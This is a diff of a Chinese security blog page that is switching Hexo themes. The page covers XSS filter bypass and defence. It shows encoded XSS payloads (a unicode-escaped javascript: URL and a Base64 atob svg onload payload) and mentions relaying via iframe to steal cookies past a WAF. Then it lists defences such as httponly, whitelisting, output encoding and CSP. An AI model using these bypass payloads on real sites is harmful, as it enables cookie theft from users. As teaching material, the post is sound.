-<p>&#x4EE5;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x91C7;&#x7528;&#x7F16;&#x7801;&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x7ED5;&#x8FC7; &#x3002;&#x6536;&#x96C6;playload&#x662F;&#x4E00;&#x79CD;&#x9519;&#x8BEF;&#x9009;&#x62E9;&#xFF0C;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#xFF01;</p>
+<p>可根据环境再次URL编码 </p>
+<h2 id="关于十进制编码"><a href="#关于十进制编码" class="headerlink" title="关于十进制编码:"></a>关于十进制编码:</h2><p><code>location.href=‘javascript:document.write(‘&lt;script&gt;alert&lt;/script&gt;’);</code></p>
+<p>编码为：</p>
+<p><code>location.href=‘j\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u0027\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0027\u0029\u003b</code></p>
+<h2 id="关于Base64编码"><a href="#关于Base64编码" class="headerlink" title="关于Base64编码:"></a>关于Base64编码:</h2><p><code>document.write(atob(‘PC9zY3JpcHQ+PHN2Zy9vbmxvYWQ9YWxlcnQoMSk7Pg==‘))</code></p>
+<p>以具体情况采用编码的形式去绕过 。收集playload是一种错误选择，持续更新！</p>
 <blockquote>
-<p>&#x67D0;&#x4E9B;&#x65F6;&#x5019;&#x56E0;&#x4E3A;&#x8F93;&#x5165;&#x94ED;&#x611F;&#x6807;&#x7B7E;&#x88AB;WAF(&#x4F8B;&#x5982;&#x67D0;&#x77E5;&#x9053;&#x521B;&#x5B87;)&#x62E6;&#x622A;&#x4E86;,POST&#x5305;&#x957F;&#x5EA6;&#x9650;&#x5236;&#x65E0;&#x6CD5;&#x4F20;&#x8F93;&#x2026;..&#x7B49;&#x7B49;,&#x7531;&#x4E8E;&#x6700;&#x8FD1;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x3002;&#x4F46;&#x662F;&#x5B8C;&#x5168;&#x5728;&#x539F;&#x9875;&#x9762;&#x53BB;&#x4E2D;&#x8F6C; , &#x7528;iframe  embed &#x7B49;&#x6846;&#x67B6;&#x6765;&#x4E2D;&#x8F6C; &#x914D;&#x5408;XSS &#x6765;&#x83B7;&#x53D6;cookie &#x7B49;&#x64CD;&#x4F5C;&#x3002;</p>
+<p>某些时候因为输入铭感标签被WAF(例如某知道创宇)拦截了,POST包长度限制无法传输…..等等,由于最近经常出现这种情况。但是完全在原页面去中转 , 用iframe  embed 等框架来中转 配合XSS 来获取cookie 等操作。</p>
 </blockquote>
-<h2 id="0x02-XSS&#x9632;&#x5FA1;"><a href="#0x02-XSS&#x9632;&#x5FA1;" class="headerlink" title="0x02 XSS&#x9632;&#x5FA1;:"></a>0x02 XSS&#x9632;&#x5FA1;:</h2><p>&#x4EE5;&#x4E0B;&#x5217;&#x4E3E;&#x51E0;&#x79CD;&#x5E38;&#x89C1;&#x7684;&#x9632;&#x5FA1;&#x65B9;&#x6CD5;&#x5427;,&#x4E5F;&#x662F;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x6BD4;&#x8F83;&#x6709;&#x6548;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p>
-<ol class="ui list">
-<li><p>&#x53EF;&#x4EE5;&#x5728;Cookie&#x4E2D;&#x8BBE;&#x7F6E;httponly(&#x6D4F;&#x89C8;&#x5668;&#x7981;&#x6B62;&#x9875;&#x9762;&#x7684;js&#x8BBF;&#x95EE;&#x5E26;&#x6709;httponly&#x5C5E;&#x6027;&#x7684;cookie)&#x3002;</p>
+<h2 id="0x02-XSS防御"><a href="#0x02-XSS防御" class="headerlink" title="0x02 XSS防御:"></a>0x02 XSS防御:</h2><p>以下列举几种常见的防御方法吧,也是个人觉得比较有效的方式。</p>
+<ol>
+<li><p>可以在Cookie中设置httponly(浏览器禁止页面的js访问带有httponly属性的cookie)。</p>
 </li>
-<li><p>&#x68C0;&#x6D4B;&#x8F93;&#x5165;,&#x8BBE;&#x7F6E;&#x767D;&#x540D;&#x5355;&#x65B9;&#x5F0F;</p>
+<li><p>检测输入,设置白名单方式</p>
 </li>
-<li><p>&#x8F93;&#x51FA;&#x68C0;&#x67E5;,&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x4F4D;&#x7F6E;&#x7684;&#x8F93;&#x51FA;,&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&#x65B9;&#x5F0F;(&#x7F16;&#x7801;,&#x8F6C;&#x4E49;,&#x5E38;&#x7528;&#x7F16;&#x7801;:html&#x7F16;&#x7801;,js&#x7F16;&#x7801;&#x7B49;),&#x6BD4;&#x8F83;&#x6709;&#x9488;&#x5BF9;&#x6027;&#x7684;&#x51FD;&#x6570;:htmlspecialchars,strip_tags&#x7B49;&#x51FD;&#x6570;,&#x53BB;&#x9664;html&#x6807;&#x7B7E;&#x3002;</p>
+<li><p>输出检查,针对不同位置的输出,使用不同的处理方式(编码,转义,常用编码:html编码,js编码等),比较有针对性的函数:htmlspecialchars,strip_tags等函数,去除html标签。</p>
 </li>
-<li><p>&#x5904;&#x7406;&#x5BCC;&#x6587;&#x672C; (&#x4F7F;&#x7528;&#x767D;&#x540D;&#x5355;&#x65B9;&#x5F0F;)&#x3002;</p>
+<li><p>处理富文本 (使用白名单方式)。</p>
 </li>
-<li><p>header&#x4E2D;&#x4F7F;&#x7528; content&#x2014;Sencurity-Policy&#x5B57;&#x6BB5;,&#x89C4;&#x5B9A;&#x8BF7;&#x6C42;js&#x7684;&#x57DF;&#x540D;&#x767D;&#x540D;&#x5355;(CSP&#x7B56;&#x7565;)</p>
+<li><p>header中使用 content—Sencurity-Policy字段,规定请求js的域名白名单(CSP策略)</p>
 </li>
 </ol>
-<h2 id="&#x8BBE;&#x7F6E;httponly"><a href="#&#x8BBE;&#x7F6E;httponly" class="headerlink" title="&#x8BBE;&#x7F6E;httponly"></a>&#x8BBE;&#x7F6E;httponly</h2><p><code>httponly&#x65E0;&#x6CD5;&#x5B8C;&#x5168;&#x7684;&#x9632;&#x5FA1;xss&#x6F0F;&#x6D1E;,&#x5B83;&#x53EA;&#x662F;&#x89C4;&#x5B9A;&#x4E86;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;js&#x53BB;&#x83B7;&#x53D6;cookie&#x7684;&#x5185;&#x5BB9;,&#x9632;&#x6B62;&#x4E86;&#x7528;&#x6237;&#x51ED;&#x8BC1;&#x52AB;&#x6301;&#x7684;&#x95EE;&#x9898;&#x3002;</code></p>
-<h2 id="XSS-filter"><a href="#XSS-filter" class="headerlink" title="XSS filter"></a>XSS filter</h2><p><code>XSS filter &#x5F80;&#x5F80;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6587;&#x4EF6;,&#x91CC;&#x9762;&#x5305;&#x542B;&#x4E86;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x8F93;&#x5165;&#x63D0;&#x4EA4;&#x7684;&#x5B57;&#x7B26;(&#x4E5F;&#x5305;&#x542B;&#x4E86;&#x4E0D;&#x8FD0;&#x884C;&#x7528;&#x6237;
-&#x63D0;&#x4EA4;&#x7684;&#x5B57;&#x7B26;,&#x4ED6;&#x7684;&#x68C0;&#x6D4B;&#x70B9;&#x662F;&#x5728;&#x4E8E;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#x7684;&#x65F6;&#x5019;,&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x767D;&#x540D;&#x5355;,&#x4F46;&#x5373;&#x4F7F;&#x4F7F;&#x7528;&#x767D;&#x540D;&#x5355;&#x4E5F;&#x65E0;&#x6CD5;&#x675C;&#x7EDD;XSS&#x7684;&#x95EE;&#x9898;&#x3002;</code></p>
-<h2 id="&#x7F16;&#x7801;&#x8F6C;&#x4E49;"><a href="#&#x7F16;&#x7801;&#x8F6C;&#x4E49;" class="headerlink" title="&#x7F16;&#x7801;&#x8F6C;&#x4E49;"></a>&#x7F16;&#x7801;&#x8F6C;&#x4E49;</h2><p><code>&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#x6709;&#x5F88;&#x591A;,&#x6BD4;&#x5982;html&#x7F16;&#x7801;,url&#x7F16;&#x7801;,16&#x8FDB;&#x5236;&#x7F16;&#x7801;,javascript&#x7F16;&#x7801;&#x7B49;&#x3002;</code><br><code>&#x5728;&#x5904;&#x7406;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x65F6;&#x5019;,&#x9664;&#x4E86;&#x7528;XSS filter&#x7684;&#x65B9;&#x5F0F;&#x8FC7;&#x6EE4;&#x4E00;&#x4E9B;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x5916;,&#x8FD8;&#x9700;&#x8981;&#x7F16;&#x7801;,&#x5C06;&#x4E00;&#x4E9B;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x901A;&#x8FC7;&#x7F16;&#x7801;&#x7684;&#x65B9;&#x5F0F;&#x6539;&#x53D8;&#x539F;&#x6765;&#x7684;&#x6837;&#x5B50;,&#x4ECE;&#x800C;&#x4E0D;&#x80FD;&#x88AB;&#x6D4F;&#x89C8;&#x5668;&#x5F53;&#x6210;js&#x4EE3;&#x7801;&#x6267;&#x884C;</code>&#x3002;</p>
-<h2 id="&#x5904;&#x7406;&#x5BCC;&#x6587;&#x672C;"><a href="#&#x5904;&#x7406;&#x5BCC;&#x6587;&#x672C;" class="headerlink" title="&#x5904;&#x7406;&#x5BCC;&#x6587;&#x672C; "></a>&#x5904;&#x7406;&#x5BCC;&#x6587;&#x672C; </h2><p><code>&#x6709;&#x4E00;&#x4E9B;&#x7F51;&#x9875;&#x7F16;&#x8F91;&#x5668;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x4E00;&#x4E9B;&#x81EA;&#x5B9A;&#x4E49;&#x7684;html&#x4EE3;&#x7801; ,&#x79F0;&#x4E3A;&#x5BCC;&#x6587;&#x672C; ,&#x8981;&#x60F3;&#x5728;&#x5BCC;&#x6587;&#x672C;&#x5904;&#x9632;&#x5FA1;XSS&#x6F0F;&#x6D1E;,&#x6700;&#x7B80;&#x5355;&#x6709;&#x6548;&#x7684;&#x65B9;&#x6CD5;&#x52A0;&#x662F;&#x63A7;&#x5236;&#x7528;&#x6237;&#x80FD;&#x4F7F;&#x7528;&#x7684;&#x6807;&#x7B7E;,&#x9650;&#x5236;&#x4E3A;&#x53EA;&#x80FD;&#x4F7F;&#x7528;a.div&#x7B49;&#x5B89;&#x5168;&#x6807;&#x7B7E;&#x3002;</code></p>
-<h2 id="&#x5904;&#x7406;&#x6240;&#x6709;&#x8F93;&#x51FA;&#x7C7B;&#x578B;&#x7684;XSS&#x6F0F;&#x6D1E;"><a href="#&#x5904;&#x7406;&#x6240;&#x6709;&#x8F93;&#x51FA;&#x7C7B;&#x578B;&#x7684;XSS&#x6F0F;&#x6D1E;" class="headerlink" title="&#x5904;&#x7406;&#x6240;&#x6709;&#x8F93;&#x51FA;&#x7C7B;&#x578B;&#x7684;XSS&#x6F0F;&#x6D1E;"></a>&#x5904;&#x7406;&#x6240;&#x6709;&#x8F93;&#x51FA;&#x7C7B;&#x578B;&#x7684;XSS&#x6F0F;&#x6D1E;</h2><p><code>XSS&#x6F0F;&#x6D1E;&#x672C;&#x8D28;&#x4E0A;&#x662F;&#x4E00;&#x79CD;html&#x6CE8;&#x5165;,&#x9875;&#x52A0;&#x662F;&#x5C06;html&#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x5230;&#x7F51;&#x9875;&#x4E2D;,&#x90A3;&#x4E48;&#x5176;&#x9632;&#x5FA1;&#x7684;&#x6839;&#x672C;&#x52A0;&#x662F;&#x5C06;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x7684;&#x4EE3;&#x7801;&#x663E;&#x793A;&#x9875;&#x9762;&#x4E0A;&#x7684;&#x65F6;&#x5019;&#x505A;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x8FC7;&#x6EE4;&#x548C;&#x8F6C;&#x4E49;&#x3002;</code></p>
+<h2 id="设置httponly"><a href="#设置httponly" class="headerlink" title="设置httponly"></a>设置httponly</h2><p><code>httponly无法完全的防御xss漏洞,它只是规定了不能使用js去获取cookie的内容,防止了用户凭证劫持的问题。</code></p>
+<h2 id="XSS-filter"><a href="#XSS-filter" class="headerlink" title="XSS filter"></a>XSS filter</h2><p><code>XSS filter 往往是一个文本文件,里面包含了允许用户输入提交的字符(也包含了不运行用户
+提交的字符,他的检测点是在于用户的输入的时候,推荐使用白名单,但即使使用白名单也无法杜绝XSS的问题。</code></p>
+<h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><p><code>编码方式有很多,比如html编码,url编码,16进制编码,javascript编码等。</code><br><code>在处理用户输入的时候,除了用XSS filter的方式过滤一些敏感字符外,还需要编码,将一些敏感字符通过编码的方式改变原来的样子,从而不能被浏览器当成js代码执行</code>。</p>
+<h2 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本 "></a>处理富文本 </h2><p><code>有一些网页编辑器允许用户提交一些自定义的html代码 ,称为富文本 ,要想在富文本处防御XSS漏洞,最简单有效的方法加是控制用户能使用的标签,限制为只能使用a.div等安全标签。</code></p>
+<h2 id="处理所有输出类型的XSS漏洞"><a href="#处理所有输出类型的XSS漏洞" class="headerlink" title="处理所有输出类型的XSS漏洞"></a>处理所有输出类型的XSS漏洞</h2><p><code>XSS漏洞本质上是一种html注入,页加是将html代码注入到网页中,那么其防御的根本加是将用户提交的代码显示页面上的时候做一系列的过滤和转义。</code></p>
 
-                        
-                    </div>
-
-                    
-                    
-                    
-
-                    <div class="description post-description">
-    <span class="post-description-item">
-        <time datetime="2018-10-17T16:34:14.000Z" itemprop="datePublished">2018-10-18</time>
-
-    </span>
-    <span class="post-description-item">
         
-    </span>
-</div>
-
-                </div>
-                
-                <div id="pagination" class="nav-web ui text container pagination">
-
-    <div class="ui stackable two column divided grid container">
-        <div class="row">
-            <div class="column nav-left">
-                
-
-                <a href="/c1y2m3.github.io/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /" class="ui tiny button">
-
-                    <i class="angle left icon"></i>
-                    
-                    从SELF-XSS到存储型XSS/附绕过token分析过程
-                    
-
-                </a>
-
-                
-            </div>
-            <div class="column nav-right">
-                
-
-                <a href="/c1y2m3.github.io/2018/10/17/端口转发的学习/" class="ui tiny button">
-                    
-                    关于内网端口转发学习
-                    
-                    <i class="angle right icon"></i></a>
-                
-            </div>
+        <br>
+        <div id="comment-container">
         </div>
-    </div>
+        <div id="disqus_thread"></div>
 
-</div>
-                
-            </div>
-
-            
-            <div class="three wide computer three wide tablet column">
-
-                <div class="ui sticky article-toc" id="article-toc">
-                    <!-- toc -->
-                    <ol class="ui ordered list"><li><a href="#0x01-XSS分类"><span>0x01   XSS分类 </span></a></li><li><a href="#XSS危害"><span>XSS危害:</span></a></li><li><a href="#XSS探测"><span>XSS探测:</span></a></li><li><a href="#关于绕过"><span>关于绕过:</span></a></li><li><a href="#如果过滤-lt-script-gt-的前提下"><span>如果过滤<script>的前提下:</span></a></li><li><a href="#如果过滤script情况下"><span>如果过滤script情况下 </span></a></li><li><a href="#如果输出在-lt-script-gt-标签下"><span>如果输出在<script>标签下 :</span></a></li><li><a href="#关于javascript-x16进制编码"><span>关于javascript x16进制编码:</span></a></li><li><a href="#关于十进制编码"><span>关于十进制编码:</span></a></li><li><a href="#关于Base64编码"><span>关于Base64编码:</span></a></li><li><a href="#0x02-XSS防御"><span>0x02 XSS防御:</span></a></li><li><a href="#设置httponly"><span>设置httponly</span></a></li><li><a href="#XSS-filter"><span>XSS filter</span></a></li><li><a href="#编码转义"><span>编码转义</span></a></li><li><a href="#处理富文本"><span>处理富文本 </span></a></li><li><a href="#处理所有输出类型的XSS漏洞"><span>处理所有输出类型的XSS漏洞</span></a></li></ol>
-                </div>
-
-            </div>
-            
-
+        <div id="lv-container">
         </div>
-    </div>
-</div>
 
-</script></span></a></li></ol></div></div></div></div></div>
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        </div>
-        <div class="ui vertical footer segment">
-    <div class="ui center aligned container">
-        <div class="ui inverted section divider"></div>
-        &copy; 2019 <a href="/">John Doe</a>,
-        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
     </div>
 </div>
 
     </div>
+</div>
 
 
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
 
+        
 
-<!-- scripts list from theme config.yml -->
+        
 
-<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
 
-<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
-
-<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
-
-<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
 
 
 
 </body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/c1y2m3.github.io/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
 </html>
